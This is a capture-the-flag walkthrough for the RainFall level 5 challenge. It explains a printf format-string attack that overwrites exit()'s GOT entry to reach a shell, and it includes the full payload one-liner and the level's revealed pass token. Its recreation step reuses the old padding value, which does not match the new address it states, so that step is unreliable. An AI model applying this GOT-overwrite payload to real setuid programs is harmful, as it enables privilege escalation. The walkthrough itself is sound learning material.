# Level 5

## Vulnerability

Global Offset Table Exploit + printf string vulnerability

## Context

```
level5@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
level5@RainFall:~$ ./level5
hello
hello
```
We have a binary that prints input from the stdin.

## Solution

Let's take a look at the binary in gdb. <br/>
We can see here that ```level5``` makes a call to ```main()```, which makes a call to a function ```n()```. <br/>
There is also a function ```o()``` which is not called. 
```
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave
   0x08048510 <+12>:	ret
```
Let's take a deeper look a ```n()```. <br/>
We can see two function calls in ```n()```. <br/>
One is to ```fgets()```, which is protected against buffer overflow attacks. <br/>
The other is to ```printf()```, which is vulnerable to string format exploits. <br/>
The function then calls ```exit()```.
```
(gdb) disas n
Dump of assembler code for function n:
[...]
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
[...]
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
[...]
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```
In ```o()```, we can see a call to ```system()```, which launches a new shell. 
```
(gdb) disas o
Dump of assembler code for function o:
[...]
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
```
Why are all these functions ```@plt```? <br/> <br/>
~ A little background: ~ <br/>
A ```PLT``` (or Procedure Linkage Table) is a special section in compiled programs which consists of many jump instructions to external  <br/>
functions / shared libraries (for example, libc functions). These jump instructions jump to the ```GOT``` (or Global Offset Table),  <br/>
which contains the actual function address. <br/>
The PLT is read-only, but the GOT can be written to. <br/>
The execution flow of the program can be controlled by overwriting one of the GOT's function addresses. <br/> <br/>
So... what's the plan? <br/>
We can leverage ```printf``` in a format string attack to replace the address of ```exit()``` with the address of ```o()```, <br/>
which will then call ```system``` to launch a new shell. <br/> <br/> 
Let's locate the addresses of ```exit()``` and ```o()```. <br/> 
```
(gdb) info functions
All defined functions:

[...]
0x080483d0  exit@plt
0x080484a4  o
```
Unfortunately, the real address of ```exit()``` is in the GOT. Let's looks there. 
```
level5@RainFall:~$ objdump -R level5 | grep exit
08049838 R_386_JUMP_SLOT   exit
```
So the address of ```exit()``` is 0x08049838, and the address of ```o()``` is 0x080484a4.<br/><br/>

Just like in level3, let's check our buffer position with a ```printf()``` string format exploit.
```
level5@RainFall:~$ python -c 'print "AAAA %x %x %x %x %x %x %x"' | ./level5
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
```
We can see our buffer "AAAA" in the 4th position on the stack as 41414141. <br/>
So let's replace "AAAA" with the address of ```exit()``` (in little endian). <br/><br/>
The next step is to overwrite ```exit()``` by ```o()```, using the the ```%n``` modifier. <br/>
For the ```%n``` modifier, we need the number of bytes to write. <br/>
"0x080484a4" in decimal is "134513828" (minus the exit GOT address [4 bytes]). <br/><br/>
Here is what our string attack will look like:
```
"exit GOT address" + "134513828 - 4 bytes" + "%4$n"
python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' 
```
Let's try it out!
```
level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' ; cat -) | ./level5
[You will find are in an infinite print loop. Type anything and press "enter"]
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## Recreate Exploited Binary

As user level6, in /tmp, create and compile level5_source.c.
```
level6@RainFall:~$ cd /tmp
level6@RainFall:/tmp$ gcc level5_source.c -fno-stack-protector -Wno-format-security -o level5_source
```
Edit permissions including suid, then move the binary to home directory.
```
level6@RainFall:/tmp$ chmod u+s level5_source
level6@RainFall:/tmp$ chmod +wx ~; mv level5_source ~
```
Exit back to user level5, then run the binary. <br/>
Notes: 
- Our new address for ```exit()``` is located at 0x0804a014 (but we still print the address in little endian).
- Our new address for ```o()``` is located at 0x080484c4 => 134513860 (minus the exit GOT address [4 bytes])
```
level6@RainFall:/tmp$ exit
exit
level5@RainFall:~$ (python -c 'print "\x14\xa0\x04\x08" + "%134513824d" + "%4$n"' ; cat -) | /home/user/level6/level5_source
[... infinite print loop ...]
cat /home/user/level6/.pass
```
